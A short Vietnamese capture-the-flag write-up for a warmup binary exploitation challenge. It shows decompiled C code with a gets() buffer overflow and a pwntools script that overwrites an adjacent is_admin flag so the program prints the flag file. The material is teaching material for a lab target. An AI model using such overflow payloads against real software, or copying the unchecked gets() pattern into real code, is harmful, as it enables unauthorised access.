Hướng dẫn cách giải bài warmup của giải KCSC-Recruitment-2025

**Author:** Nguyễn Cao Nhân aka Nhân Sigma

**Category:** Binary Exploitation

**Date:** 28/09/2026

## 1. Mục tiêu
Đầu tiên đọc code

```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setup(argc, argv, envp);
  printf("Input: ");
  gets(buf);      // BOF
  printf("Your input: %s\n", buf);
  if ( is_admin )
    system("cat /flag");
  return 0;
}
```

Nhìn vô là thấy lỗi, `buf` với `is_admin` nằm ở vùng `bss`

<img width="586" height="378" alt="image" src="https://github.com/user-attachments/assets/7460640c-9fc8-4f8c-ad52-75505e9afe7d" />

Vậy chỉ cần ghi vào `buf` đến `is_admin` và sửa thành 1 là xong.

## 2. Cách thực thi
```Python
from pwn import *

p = process('./main')

payload = b'A' * 0x100
payload += p64(1)

p.sendlineafter(b'Input: ', payload)

p.interactive()
```

Khá là đơn giản, 1 bài warm up nhẹ nhàng để chuẩn bị các bài quái thú khác 🐧.
